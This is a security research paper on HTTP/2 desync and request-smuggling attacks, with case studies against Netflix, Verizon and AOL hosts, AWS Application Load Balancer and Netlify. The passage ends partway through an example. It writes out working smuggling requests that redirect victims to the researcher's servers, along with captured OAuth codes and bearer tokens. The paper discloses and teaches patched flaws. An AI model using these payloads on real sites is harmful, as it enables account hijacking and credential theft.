HTTP/2: The Sequel is Always Worse
James Kettle - PI:EMAIL - @albinowax
HTTP/2 is easily mistaken for a transport-layer protocol that can be swapped in with zero security
implications for the website behind it. Two years ago, I presented HTTP Desync Attacks and kicked off a
wave of request smuggling, but HTTP/2 escaped serious analysis. In this paper, I'll take you beyond the
frontiers of existing HTTP/2 research, to unearth horrifying implementation flaws and subtle RFC
imperfections.
I'll show you how these flaws enable HTTP/2-exclusive desync attacks, with case studies targeting high-
profile websites powered by servers ranging from Amazon's Application Load Balancer to WAFs, CDNs,
and bespoke stacks by big tech. I'll demonstrate critical impact by hijacking clients, poisoning caches, and
stealing plaintext passwords to net multiple max-bounties. One of these attacks remarkably offers an array of
exploit-paths surpassing all known techniques.
After that, I'll unveil novel techniques and tooling to crack open a widespread but overlooked request
smuggling variant affecting both HTTP/1 and HTTP/2 that is typically mistaken for a false positive.
Finally, I'll drop multiple exploit-primitives that resurrect a largely forgotten class of vulnerability, and use
HTTP/2 to expose a fresh application-layer attack surface.
I'll leave you with an open-source scanner with accurate automated detection, a custom, open-source HTTP/2
stack so you can try out your own ideas, and free interactive labs so you can hone your new skills on live
systems.
Outline
HTTP/2 for Hackers
Pseudo-Headers
Binary Protocol
Message Length
HTTP/2 Desync Attacks
H2.CL on Netflix
H2.TE on Application Load Balancer
H2.TE via Request Header Injection
H2.X via Request Splitting
H2.TE via Header Name Injection
H2.TE via Request Line Injection
Desync-Powered Request Tunnelling
Confirmation
Tunnel Vision
Exploitation: Guessing Internal Headers
Exploitation: Leaking Internal Headers
Exploitation: Cache Poisoning
HTTP/2 Exploit Primitives
Ambiguity and HTTP/2
URL Prefix Injection
Header Name Splitting
Request Line Injection
Header Tampering Wrap
Essential Information
Hidden HTTP/2
Connection
Tooling
Defence
Further Reading
Conclusion
HTTP/2 for Hackers
The first step to exploiting HTTP/2 is learning the protocol fundamentals. Fortunately, there's less to learn
than you might think.
I started this research by coding an HTTP/2 client from scratch, but I've concluded that for the attacks
described in this paper, we can safely ignore the details of many lower-level features like frames and streams.
Although HTTP/2 is complex, it's designed to transmit the same information as HTTP/1.1. Here's an
equivalent request represented in the two protocols.
HTTP/1.1:
POST /login HTTP/1.1\r\n 
Host: psres.net\r\n 
User-Agent: burp\r\n 
Content-Length: 9\r\n 
\r\n 
x=123&y=4
HTTP/2:
:method POST
:path /login
:authority psres.net
:scheme https
user-agent burp
x=123&y=4
Assuming you're already familiar with HTTP/1, there are only three new concepts that you need to
understand.
Pseudo-Headers
In HTTP/1, the first line of the request contains the request method and path. HTTP/2 replaces the request
line with a series of pseudo-headers. The five pseudo-headers are easy to recognize as they're represented
using a colon at the start of the name:
:method - The request method 
:path - The request path. Note that this includes the query string 
:authority - The Host header, roughly 
:scheme - The request scheme, typically 'http' or 'https' 
:status - The response status code - not used in requests 
Binary Protocol
HTTP/1 is a text-based protocol, so requests are parsed using string operations. For example, a server needs
to look for a colon in order to know when a header name ends. The potential for ambiguity in this approach
is what makes desync attacks possible. HTTP/2 is a binary protocol like TCP, so parsing is based on
predefined offsets and much less prone to ambiguity. This paper represents HTTP/2 requests using a human-
readable abstraction rather than the actual bytes. For example, on the wire, pseudo-header names are actually
mapped to a single byte - they don't really contain a colon.
Message Length
In HTTP/1, the length of each message body is indicated via the Content-Length or Transfer-Encoding
header.
In HTTP/2, those headers are redundant because each message body is composed of data frames which have
a built-in length field. This means there's little room for ambiguity about the length of a message, and might
leave you wondering how desync attacks using HTTP/2 are possible. The answer is HTTP/2 downgrading.
HTTP/2 Desync Attacks
Request Smuggling via HTTP/2 Downgrades
HTTP/2 downgrading is when a front-end server speaks HTTP/2 with clients, but rewrites requests into
HTTP/1.1 before forwarding them on to the back-end server. This protocol translation enables a range of
attacks, including HTTP request smuggling:
Classic request smuggling vulnerabilities mostly occur because the front-end and back-end disagree about
whether to derive a request's length from its Content-Length (CL), or Transfer-Encoding (TE) header.
Depending on which way around this desynchronization happens, the vulnerability is classified as CL.TE or
TE.CL.
Front-ends speaking HTTP/2 almost always use HTTP/2's built-in message length. However, the back-end
receiving a downgraded request doesn't have access to this data, and must use the CL or TE header. This
leads to two main types of vulnerability: H2.TE and H2.CL.
Case Studies
We've now covered enough theory to start exploring some real vulnerabilities. To find these, I implemented
automated detection in HTTP Request Smuggler, using an adapted version of the timeout-based H1-desync
detection strategy1. Once implemented, I used this to scan my pipeline of websites with bug-bounty
programs2. All the referenced vulnerabilities have been patched unless otherwise stated, and over 50% of the
total bug-bounty earnings has been donated to local charities.
The following section assumes the reader is familiar with HTTP Request Smuggling. If you find any of the
explanations are insufficient, I recommend reading or watching HTTP Desync Attacks: Request Smuggling
Reborn3, and tackling our Web Security Academy labs4.
H2.CL Desync on Netflix
Thanks to HTTP/2's data-frame length field, the Content-Length header is not required. However, the
HTTP/2 RFC5 states that this header is permitted, provided it's correct. For our first case study, we'll target
www.netflix.com, which used a front-end that performed HTTP downgrading without verifying the content-
length. This enabled an H2.CL desync.
To exploit it, I issued the following HTTP/2 request:
:method POST
:path /n
:authority www.netflix.com
content-length 4
abcdGET /n HTTP/1.1 
Host: 02.rs?x.netflix.com 
Foo: bar
After the front-end downgraded this request to HTTP/1.1, it hit the back-end looking something like:
POST /n HTTP/1.1 
Host: www.netflix.com 
Content-Length: 4 
abcdGET /n HTTP/1.1 
Host: 02.rs?x.netflix.com 
Foo: bar
Thanks to the incorrect Content-Length, the back-end stopped processing the request early and the data in
orange was treated as the start of another request. This enabled me to add an arbitrary prefix to the next
request, regardless of who sent it.
The orange prefix was crafted to trigger a response redirecting the victim's request to my server at 02.rs:
GET /anything HTTP/1.1 
Host: www.netflix.com
HTTP/1.1 302 Found 
Location: https://02.rs?x.netflix.com/n
By redirecting JavaScript includes, I could compromise Netflix accounts, stealing passwords and credit card
numbers. By running this attack in a loop I could gradually compromise all active users of the site, with no
user-interaction. This severity is typical for request smuggling.
Netflix traced this vulnerability through Zuul6 back to Netty7, and it's now been patched and tracked as CVE-
2021-212958. Netflix awarded their maximum bounty - $20,000.
H2.TE Desync on Application Load Balancer
Next up, let's take a look at a straightforward H2.TE desync. The RFC states
any message containing connection-specific header fields MUST be treated as malformed
One connection-specific header field is Transfer-Encoding. Amazon Web Services' (AWS) Application Load
Balancer failed to obey this line, and accepted requests containing Transfer-Encoding. This meant that I
could exploit almost every website using it, via an H2.TE desync.
One vulnerable website was Verizon's law enforcement access portal, located at id.b2b.oath.com. I exploited
it using the following request:
:method POST
:path /identitfy/XUI
:authority id.b2b.oath.com
transfer-encoding chunked
0 
GET /oops HTTP/1.1 
Host: psres.net 
Content-Length: 10 
x=
The front-end downgraded this request into:
POST /identity/XUI/ HTTP/1.1 
Host: id.b2b.oath.com 
Content-Length: 68 
Transfer-Encoding: chunked 
0 
GET /oops HTTP/1.1 
Host: psres.net 
Content-Length: 10 
x=
This should look familiar - H2.TE exploitation is very similar to CL.TE. After downgrading, the 'transfer-
encoding: chunked' header, which was conveniently ignored by the front-end server, takes priority over the
frontend-inserted Content-Length. This made the back-end stop parsing the request body early and gave us
the ability to redirect arbitrary users to my site at psres.net.
When I reported this, the triager requested further evidence that I could cause harm, so I started redirecting
live users and quickly found that I was catching people in the middle of an OAuth login flow, helpfully
leaking their secret code via the Referer header:
GET /b2blanding/show/oops HTTP/1.1 
Host: psres.net 
Referer: https://id.b2b.oath.com/?â€¦&code=secret
Verizon awarded a $7,000 bounty for this finding.
I encountered a similar vulnerability with a different exploit path on accounts.athena.aol.com - the CMS
powering various news sites including the Huffington Post and Engadget. Here, I could once again issue an
HTTP/2 request that, after being downgraded, hit the back-end and injected a prefix that redirected victims to
my domain:
POST /account/login HTTP/1.1 
Host: accounts.athena.aol.com 
Content-Length: 104 
Transfer-Encoding: chunked 
0 
GET /account/1/logout?next=https://psres.net/ HTTP/1.1 
X-Ignore: X
Once again, the triager wanted more evidence, so I took the opportunity to redirect some live users. This
time, however, redirecting users resulted in a request to my server that effectively said "Can I have
permission to send you my credentials?":
OPTIONS / HTTP/1.1 
Host: psres.net 
Access-Control-Request-Headers: authorization
I hastily configured my server to grant them permission:
HTTP/1.1 200 OK 
Access-Control-Allow-Credentials: true 
Access-Control-Allow-Headers: authorization
And received a beautiful stream of creds:
GET / HTTP/1.1 
Host: psres.net 
Authorization: Bearer eyJhbGwiOiJIUzI1NiIsInR6cCI6Ikâ€¦
This showcased some interesting browser behavior I'll need to explore later, and also netted another $10,000
from Verizon.
I also reported the root vulnerability directly to Amazon, who have now patched Application Load Balancer
so their customers' websites are no longer exposed to it. Unfortunately, they don't have a research-friendly
bug bounty program.
Every website using Imperva's Cloud WAF was also vulnerable, continuing a long history of web application
firewalls making websites easier to hack.
H2.TE via Request Header Injection
As HTTP/1 is a plaintext protocol, it's impossible to put certain parsing-critical characters in certain places.
For example, you can't put a \r\n sequence in a header value - you'll just end up terminating the header.
HTTP/2's binary design, combined with the way it compresses headers, enables you to put arbitrary
characters in arbitrary places. The server is expected to re-impose certain restrictions with an extra validation
step:
Any request that contains a character not permitted in a header field value MUST be treated as
malformed
Naturally, this validation step is skipped by many servers.
One vulnerable implementation was the Netlify CDN, which enabled H2.TE desync attacks on every website
based on it, including Firefox's start page at start.mozilla.org. I crafted an exploit that used '\r\n' inside a
header value:
:method POST
:path /
:authority start.mozilla.org
foo b\r\n
transfer-encoding: chunked
0\r\n